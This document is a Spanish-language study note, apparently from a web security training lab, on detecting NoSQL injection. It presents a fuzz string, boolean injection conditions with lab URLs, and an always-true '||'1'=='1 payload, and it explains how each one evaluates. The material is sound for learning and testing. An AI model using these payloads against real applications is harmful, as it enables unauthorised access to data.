---
title: "1 - Detecting NoSQL injection"
---

# 1 - Detecting NoSQL injection

Para detectar un error enviamos una fuzz string :

```
'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

```
'"`{
;$Foo}
$Foo \xYZ
```

```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```


---

### 🔍 ¿Qué significa `' && 0 && 'x`?

Esto es una **inyección lógica** que se traduce así en lógica booleana:

```
'+%26%26+0+%26%26+'x
```

```javascript
'string' && 0 && 'x'
```

Evaluación paso a paso:

1. `'string'` es **true** en JavaScript.
    
2. `true && 0` = **0** → que es falso.
    
3. `0 && 'x'` = sigue siendo **0** (falso).
    

Entonces, la condición **es falsa** y debería impedir que los datos se devuelvan (dependiendo de cómo se use la condición en la consulta).

---

### ✅ ¿Y qué hace `' && 1 && 'x`?

Evaluamos:

```
'+%26%26+1+%26%26+'x
```


```javascript
'string' && 1 && 'x'
```

1. `'string'` → **true**
    
2. `true && 1` = **1** (truthy)
    
3. `1 && 'x'` = **'x'** (truthy)
    

Así que el resultado es **truthy** y la condición permite que la consulta continúe.

---

No carga

```
https://0a8e00a703d8592681e1a24100fe00ab.web-security-academy.net/filter?category=LifeStyle%27+%26%26+0+%26%26+%27x
```

Carga

```
https://0a8e00a703d8592681e1a24100fe00ab.web-security-academy.net/filter?category=Lifestyle%27+%26%26+1+%26%26+%27x
```

or 1=1 -- - version nosql : 

```
'||'1'=='1
%27%7c%7c%27%31%27%3d%3d%27%31
```
